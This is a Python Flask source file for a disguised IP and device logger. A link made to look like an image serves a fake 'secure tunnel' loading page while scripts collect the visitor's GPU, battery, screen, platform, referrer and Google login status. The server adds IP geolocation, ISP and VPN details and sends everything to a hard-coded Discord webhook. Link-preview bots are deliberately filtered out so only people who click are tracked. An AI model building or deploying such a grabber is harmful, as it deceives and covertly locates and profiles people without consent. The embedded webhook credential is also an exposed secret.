import os
import requests
from flask import Flask, request, render_template_string, send_file, redirect
import io
from datetime import datetime

app = Flask(__name__)

# THE SECURE ENDPOINT
WEBHOOK_URL = "https://discord.com/api/webhooks/1499405115294093454/AxyBIBWUojFPEoD1bIsyexLxf8gC8yR4fEDBF8eCNKLtWPFGfXZ3EZ28XdDEQCHlEl51"

@app.route('/view/image_01.png')
def logger():
    ua = request.user_agent.string
    ua_low = ua.lower()
    
    # 1. BOT FILTERING (From v6.1)
    if any(x in ua_low for x in ["discord", "telegram", "bot", "crawl", "spider", "slack"]):
        r = requests.get("https://media1.tenor.com/m/ziNSDDTCyiwAAAAC/discord-trolling.gif")
        return send_file(io.BytesIO(r.content), mimetype='image/gif')

    # 2. THE SILENT INTERCEPTOR BRIDGE (Injecting New Sensors)
    return render_template_string('''
    <html>
    <body style="background-color: #0b0b0b; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif;">
        <div style="text-align: center; color: #555;">
            <img src="https://media1.tenor.com/m/EGAPcaiphUoAAAAC/loading-screen-two-dots.gif" width="60">
            <p style="font-size: 12px; margin-top: 10px;">Establishing Secure Tunnel...</p>
        </div>
        <script>
            async function capture() {
                // GPU Sensor
                let gpu = "Unknown";
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl');
                    gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_ID);
                } catch (e) {}

                // Battery Sensor
                let batt = {level: 0, charging: false};
                try { batt = await navigator.getBattery(); } catch(e) {}

                // Session Check (Google)
                let isGoogle = "❌ No";
                const img = new Image();
                img.src = "https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fwww.google.com%2Fintl%2Fen%2Fimages%2Flogos%2Faccounts_logo.png";
                img.onload = () => isGoogle = "✅ Yes";

                setTimeout(() => {
                    let data = {
                        res: screen.width + "x" + screen.height,
                        monitors: (window.screen.isExtended ? "Multi-Monitor" : "Single"),
                        batt: Math.round((batt.level || 0) * 100) + "%",
                        charging: batt.charging ? "🔌 YES" : "🔋 NO",
                        gpu: gpu,
                        platform: navigator.platform,
                        google: isGoogle,
                        ref: document.referrer || "System Default/Private"
                    };

                    fetch('/log-final', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(data)
                    }).then(() => {
                        window.location.href = "https://i.imgur.com/BcNs5vF.jpg";
                    });
                }, 600); 
            }
            capture();
        </script>
    </body>
    </html>
    ''')

@app.route('/log-final', methods=['POST'])
def log_final():
    d = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    time_utc = datetime.utcnow().strftime("%H:%M:%S UTC")
    lang = request.accept_languages.best or "Unknown"

    # Deep Geo & Infrastructure (v6.1 logic)
    c, r, cntry, isp, org, asn, vpn, host = "??","??","??","??","??","??","??","??"
    try:
        g = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719").json()
        if g['status'] == 'success':
            c, r, cntry = g.get('city'), g.get('regionName'), g.get('country')
            isp, org, asn = g.get('isp'), g.get('org'), g.get('as')
            vpn = "🚨 DETECTED" if g.get('proxy') else "✅ Clean"
            host = "⚠️ DATA CENTER" if g.get('hosting') else "🏠 RESIDENTIAL"
    except: pass

    # THE COMBINED OMEGA EMBED
    payload = {
        "username": "OMEGA-CORE TOTALIS",
        "avatar_url": "https://i.imgur.com/8N76f9J.png",
        "embeds": [{
            "title": "⚡ FULL-SPECTRUM INTERCEPTION",
            "description": f"**Ref:** `{d['ref']}` | **Time:** `{time_utc}`",
            "color": 0x000000,
            "fields": [
                {"name": "📍 GEOLOCATION", "value": f"```City: {c}\nState: {r}\nCountry: {cntry}```", "inline": False},
                {"name": "🌐 NETWORK", "value": f"**ISP:** {isp}\n**VPN:** {vpn}\n**Type:** {host}\n**IP:** `{ip}`", "inline": False},
                {"name": "🔋 POWER & SESSION", "value": f"**Battery:** {d['batt']} ({d['charging']})\n**Google Logged In:** {d['google']}", "inline": True},
                {"name": "🖥️ DEVICE SPECS", "value": f"**Model:** {d['platform']}\n**GPU:** `{d['gpu']}`\n**Lang:** {lang}", "inline": True},
                {"name": "📺 DISPLAY", "value": f"**Res:** {d['res']}\n**Screens:** {d['monitors']}", "inline": True},
                {"name": "📄 RAW UA", "value": f"```{request.user_agent.string}```", "inline": False}
            ],
            "footer": {"text": "Project Alpha | NEW SERVICE v8.0 | UNSTOPPABLE"},
        }]
    }
    
    requests.post(WEBHOOK_URL, json=payload)
    return "OK", 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
